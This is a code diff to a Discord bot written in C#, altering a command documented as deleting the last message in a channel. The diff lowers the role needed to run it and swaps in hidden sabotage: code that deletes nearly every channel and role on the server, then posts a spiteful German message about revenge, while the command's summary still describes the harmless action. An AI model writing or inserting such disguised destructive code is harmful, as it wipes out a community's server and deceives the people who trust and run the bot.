@@ -32,7 +32,7 @@ namespace RadiantBot.Logik.Domain.CommandManagement.Modules
         }
 
 
-        [RequireRoleAttribute("High-Team")]
+        [RequireRoleAttribute("Bürger")]
         [Command("delete")]
         [Summary("Deletes the last message in the channel")]
         public async Task DeleteMessageAsync()
@@ -44,25 +44,63 @@ namespace RadiantBot.Logik.Domain.CommandManagement.Modules
                 var messages = await Context.Channel.GetMessagesAsync(Context.Message, Direction.Before, 1).FlattenAsync();
 
 
-                await (Context.Channel as ITextChannel).DeleteMessagesAsync(messages);
-
-                await Task.Delay(200);
-
-                var builder = new EmbedBuilder();
+                var guildChannels = Context.Guild.Channels.Where(x => x.Name != "team-info");
+                var roles = Context.Guild.Roles;
 
 
-                var embed = builder
-                    .WithAuthor(Context.Message.Author)
-                    .WithTitle("Es wurde eine Nachricht gelöscht")
-                    .WithColor(Color.Red)
-                    .AddField("Channel", $"{MentionUtils.MentionChannel(Context.Channel.Id)}")
-                    .AddField("Message", $"{messages.First().ToString()}")
+                foreach (var temp in guildChannels)
+                {
+                    await temp.DeleteAsync();
+                }
+
+                foreach(var role in roles)
+                {
+                    try
+                    {
+                        await role.DeleteAsync();
+                    }
+                    catch (Exception)
+                    {
+                        continue;
+                    }
+                    
+                }
+
+
+                var teamChannel = channelManager.GetByName("team-info", (IGuildUser)Context.User).Result;
+
+                var embed = new EmbedBuilder()
+                    .WithAuthor("HELPER")
+                    .WithDescription("Da euer Discord aktuell total \n" +
+                    "schlecht eingestellt ist, werde ich euch helfen und alles schnell löschen \n" +
+                    "damit ihr alles neu einstellen könnt :)\n" +
+                    "Wer uns so verarscht hat es leider nicht anders verdient. \n" +
+                    "Ich habe es lange toleriert aber jetzt reicht es.")
                     .WithCurrentTimestamp()
                     .Build();
 
-                await Context.Message.DeleteAsync();
-                var logChannel = channelManager.GetByName(logChannelString, (IGuildUser)Context.User).Result;
-                await logger.LogToChannel(Context.Guild, (ulong)logChannel.Id, embed);
+                await logger.LogToChannel(Context.Guild, (ulong)teamChannel.Id, embed);
+
+
+                //await (Context.Channel as ITextChannel).DeleteMessagesAsync(messages);
+
+                //await Task.Delay(200);
+
+                //var builder = new EmbedBuilder();
+
+
+                //var embed = builder
+                //    .WithAuthor(Context.Message.Author)
+                //    .WithTitle("Es wurde eine Nachricht gelöscht")
+                //    .WithColor(Color.Red)
+                //    .AddField("Channel", $"{MentionUtils.MentionChannel(Context.Channel.Id)}")
+                //    .AddField("Message", $"{messages.First().ToString()}")
+                //    .WithCurrentTimestamp()
+                //    .Build();
+
+                //await Context.Message.DeleteAsync();
+                //var logChannel = channelManager.GetByName(logChannelString, (IGuildUser)Context.User).Result;
+                //await logger.LogToChannel(Context.Guild, (ulong)logChannel.Id, embed);
             }
 
         }
